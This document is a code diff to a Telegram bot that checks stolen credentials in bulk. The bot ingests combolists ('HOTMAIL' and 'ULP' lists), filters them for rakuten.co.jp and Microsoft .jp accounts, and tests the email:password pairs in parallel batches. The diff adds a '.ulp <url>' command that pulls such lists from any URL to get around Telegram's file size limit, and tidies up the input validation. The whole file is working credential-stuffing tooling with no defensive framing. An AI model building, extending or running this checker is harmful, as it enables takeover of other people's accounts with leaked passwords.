@@ -18,6 +18,7 @@ const pendingMeta = new Map();
 const pendingBatches = new Map();
 const pendingFiles = new Map();
 const BATCH_CONCURRENCY = 3; // number of parallel workers per batch
+const TELEGRAM_FILE_LIMIT_BYTES = 50 * 1024 * 1024; // Telegram bot API file limit (~50MB)
 
 /**
  * Validates and parses the credential string format "user:pass".
@@ -45,52 +46,60 @@ function parseCredentials(credentialString) {
  * @param {string} email - Email to validate
  * @returns {boolean} True if valid email format
  */
-  // Handle batch file uploads: first ask type (HOTMAIL or ULP)
-  bot.on('document', async (ctx) => {
-    const doc = ctx.message && ctx.message.document;
-    if (!doc) return;
+function isValidEmail(email) {
+  if (!email || typeof email !== 'string') {
+    return false;
+  }
 
-    const chatId = ctx.chat.id;
-    const sourceMessageId = ctx.message && ctx.message.message_id;
+  const trimmed = email.trim();
+  if (!trimmed || trimmed.length > 254) {
+    return false;
+  }
 
-    let fileUrl;
-    try {
-      const link = await ctx.telegram.getFileLink(doc.file_id);
-      fileUrl = link.href || link.toString();
-    } catch (err) {
-      await ctx.replyWithMarkdown(
-        `⚠️ Unable to get file link: ${escapeV2(err.message)}`,
-        { reply_to_message_id: doc.message_id }
-      );
-      return;
-    }
+  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  return pattern.test(trimmed);
+}
 
-    const key = `${chatId}:${sourceMessageId}`;
-    pendingFiles.set(key, {
-      fileUrl,
-      filename: doc.file_name || 'file.txt',
-      size: doc.file_size,
-      sourceMessageId,
-    });
+/**
+ * Basic input guard to keep Telegram commands tidy and safe.
+ * @param {string} raw - Raw credential string
+ * @returns {{valid: boolean, error?: string}}
+ */
+function guardInput(raw) {
+  if (!raw || typeof raw !== 'string') {
+    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
+  }
 
-    await ctx.replyWithMarkdown(
-      '📂 *File received*' +
-      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
-      `\n• Size: ${formatBytes(doc.file_size)}` +
-      '\n\nSelect file type:',
-      {
-        reply_to_message_id: sourceMessageId,
-        ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback('📧 HOTMAIL', `batch_type_hotmail_${sourceMessageId}`),
-            Markup.button.callback('🗂 ULP', `batch_type_ulp_${sourceMessageId}`),
-          ],
-          [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
-        ]),
-      }
-    );
-  });
- 
+  const input = raw.trim();
+  if (!input) {
+    return { valid: false, error: 'Provide credentials in the form `.chk email:password`.' };
+  }
+
+  if (input.length > 200) {
+    return { valid: false, error: 'Input too long (max 200 characters).' };
+  }
+
+  if (input.includes('\n')) {
+    return { valid: false, error: 'Use a single-line `email:password` pair.' };
+  }
+
+  const parts = input.split(':');
+  if (parts.length !== 2) {
+    return { valid: false, error: 'Use a single colon to separate email and password.' };
+  }
+
+  const [user, pass] = parts.map((p) => p.trim());
+  if (!user || !pass) {
+    return { valid: false, error: 'Both email and password are required.' };
+  }
+
+  if (!isValidEmail(user)) {
+    return { valid: false, error: 'Email format looks invalid.' };
+  }
+
+  return { valid: true };
+}
+
 /**
  * Formats a result object into a user-friendly Telegram message with markdown.
  * @param {Object} result - Result from checkCredentials
@@ -325,18 +334,18 @@ function initializeTelegramHandler(botToken, options = {}) {
     );
   });
 
-  // Handle batch file uploads (<=50MB, Microsoft .jp domains only)
+  // Handle batch file uploads (HOTMAIL only). For ULP lists, use `.ulp <url>`.
   bot.on('document', async (ctx) => {
     const doc = ctx.message && ctx.message.document;
     if (!doc) return;
 
     const chatId = ctx.chat.id;
     const sourceMessageId = ctx.message && ctx.message.message_id;
-    const sizeLimit = 50 * 1024 * 1024;
-    if (doc.file_size && doc.file_size > sizeLimit) {
+
+    if (doc.file_size && doc.file_size > TELEGRAM_FILE_LIMIT_BYTES) {
       await ctx.replyWithMarkdown(
-        '⚠️ File too large. Max allowed size is 50MB.',
-        { reply_to_message_id: doc.message_id }
+        '⚠️ File too large for Telegram bots (max ~50MB). For ULP lists, host the file and use `.ulp <url>` instead.',
+        { reply_to_message_id: sourceMessageId }
       );
       return;
     }
@@ -353,40 +362,80 @@ function initializeTelegramHandler(botToken, options = {}) {
       return;
     }
 
+    const key = `${chatId}:${sourceMessageId}`;
+    pendingFiles.set(key, {
+      fileUrl,
+      filename: doc.file_name || 'file.txt',
+      size: doc.file_size,
+      sourceMessageId,
+    });
+
+    await ctx.replyWithMarkdown(
+      '📂 *File received*' +
+      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
+      `\n• Size: ${formatBytes(doc.file_size)}` +
+      '\n\nProcess as HOTMAIL list?',
+      {
+        reply_to_message_id: sourceMessageId,
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('📧 Proceed (HOTMAIL)', `batch_type_hotmail_${sourceMessageId}`)],
+          [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
+        ]),
+      }
+    );
+  });
+
+  // Handle ULP URL-based batch ingestion to bypass Telegram file size limits
+  bot.hears(/^\.ulp\s+(https?:\/\/\S+)/i, async (ctx) => {
+    const chatId = ctx.chat.id;
+    const sourceMessageId = ctx.message && ctx.message.message_id;
+    const url = ctx.match[1];
+
+    if (!url || url.length > 1000) {
+      await ctx.replyWithMarkdown('⚠️ Provide a valid URL after `.ulp`.', {
+        reply_to_message_id: sourceMessageId,
+      });
+      return;
+    }
+
+    try {
+      await ctx.replyWithMarkdown('⏳ Processing ULP URL (this may take a while)...', {
+        reply_to_message_id: sourceMessageId,
+      });
+    } catch (err) {
+      // ignore
+    }
+
     let batch;
     try {
-      batch = await prepareBatchFromFile(fileUrl, sizeLimit);
+      batch = await prepareUlpBatch(url, MAX_BYTES_ULP);
     } catch (err) {
-      await ctx.replyWithMarkdown(
-        `⚠️ Failed to read file: ${escapeV2(err.message)}`,
-        { reply_to_message_id: doc.message_id }
-      );
+      await ctx.replyWithMarkdown(`⚠️ Failed to read URL: ${escapeV2(err.message)}`, {
+        reply_to_message_id: sourceMessageId,
+      });
       return;
     }
 
     if (!batch.count) {
-      await ctx.replyWithMarkdown(
-        'ℹ️ No eligible Microsoft .jp credentials found in this file.',
-        { reply_to_message_id: doc.message_id }
-      );
+      await ctx.replyWithMarkdown('ℹ️ No eligible Rakuten credentials found at this URL.', {
+        reply_to_message_id: sourceMessageId,
+      });
       return;
     }
 
     const key = `${chatId}:${sourceMessageId}`;
     pendingBatches.set(key, {
       creds: batch.creds,
-      filename: doc.file_name || 'file.txt',
+      filename: url,
       count: batch.count,
-      sourceMessageId,
+      sourceMessageId: Number(sourceMessageId),
     });
 
-    const allowedDomainsText = ALLOWED_DOMAINS.map((d) => `\`${d}\``).join(', ');
     await ctx.replyWithMarkdown(
-      '📂 *File received*' +
-      `\n• Name: ${escapeV2(doc.file_name || 'file')}` +
-      `\n• Size: ${formatBytes(doc.file_size)}` +
+      '🗂 *ULP URL parsed*' +
+      `\n• Source: ${escapeV2(url.length > 120 ? `${url.slice(0, 117)}...` : url)}` +
       `\n• Eligible credentials: *${batch.count}*` +
-      '\n• Allowed domains: ' + allowedDomainsText +
+      '\n• Filter: lines containing `rakuten.co.jp` (deduped)' +
       '\n\nProceed to check them?',
       {
         reply_to_message_id: sourceMessageId,
@@ -735,74 +784,6 @@ function initializeTelegramHandler(botToken, options = {}) {
       `\n• Size: ${formatBytes(file.size)}` +
       `\n• Eligible credentials: *${batch.count}*` +
       '\n• Allowed domains: ' + allowedDomainsText +
-      '\n\nProceed to check them?',
-      {
-        reply_to_message_id: Number(msgId),
-        ...Markup.inlineKeyboard([
-          [
-            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
-            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
-          ],
-        ]),
-      }
-    );
-  });
-
-  bot.action(/batch_type_ulp_(.+)/, async (ctx) => {
-    await ctx.answerCbQuery();
-    const msgId = ctx.match[1];
-    const key = `${ctx.chat.id}:${msgId}`;
-    const file = pendingFiles.get(key);
-    if (!file) {
-      await ctx.replyWithMarkdown('⚠️ File info expired. Send the file again.', {
-        reply_to_message_id: Number(msgId),
-      });
-      return;
-    }
-
-    try {
-      await ctx.telegram.editMessageText(
-        ctx.chat.id,
-        ctx.update.callback_query.message.message_id,
-        undefined,
-        '⏳ Processing ULP file (this may take a while)...',
-        { parse_mode: 'Markdown' }
-      );
-    } catch (err) {
-      // ignore
-    }
-
-    let batch;
-    try {
-      batch = await prepareUlpBatch(file.fileUrl, MAX_BYTES_ULP);
-    } catch (err) {
-      await ctx.replyWithMarkdown(`⚠️ Failed to read file: ${escapeV2(err.message)}`, {
-        reply_to_message_id: Number(msgId),
-      });
-      return;
-    }
-
-    if (!batch.count) {
-      await ctx.replyWithMarkdown('ℹ️ No eligible Rakuten credentials found in this file.', {
-        reply_to_message_id: Number(msgId),
-      });
-      return;
-    }
-
-    pendingFiles.delete(key);
-    pendingBatches.set(key, {
-      creds: batch.creds,
-      filename: file.filename,
-      count: batch.count,
-      sourceMessageId: Number(msgId),
-    });
-
-    await ctx.replyWithMarkdown(
-      '🗂 *ULP list parsed*' +
-      `\n• Name: ${escapeV2(file.filename)}` +
-      `\n• Size: ${formatBytes(file.size)}` +
-      `\n• Eligible credentials: *${batch.count}*` +
-      '\n• Filter: lines containing `rakuten.co.jp` (deduped)' +
       '\n\nProceed to check them?',
       {
         reply_to_message_id: Number(msgId),
